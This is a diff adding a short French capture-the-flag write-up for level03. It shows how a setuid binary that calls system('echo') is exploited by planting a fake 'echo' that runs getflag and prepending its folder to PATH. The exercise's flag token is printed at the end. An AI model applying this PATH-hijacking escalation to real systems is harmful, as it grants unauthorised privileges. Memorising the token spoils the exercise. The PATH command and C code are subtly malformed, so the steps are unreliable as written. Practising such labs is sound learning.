@@ -1,0 +1,32 @@
+#Le fichier est un binaire
+
+# J'utilise ltrace pour voir sa call stack
+
+ltrace ./level03
+
+#On vois que c'est un setUID sur les droit de flag 03 qui fais un appelle a system() a la commande echo, c'est une faille
+
+#On cree un dossier dans le tmp pour pouvoir agir librement
+
+mkdir /tmp/azur
+cd /tmp/azur
+
+#On cree un fichier main.c ou l'on ecrit le programme suivant:
+
+void main()
+{
+    system("getflag")
+}
+
+#On le compile en appelant notre binaire "echo"
+
+gcc main.c -o echo
+
+#On ajoute ensuite notre dossier tmp au PATH
+
+PATH:/tmp/azur:$PATH
+
+#Il nous reste plus qu'a executer le binaire sur notre home pour qu'il utilise notre version de echo
+
+./level03
+>>>>Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
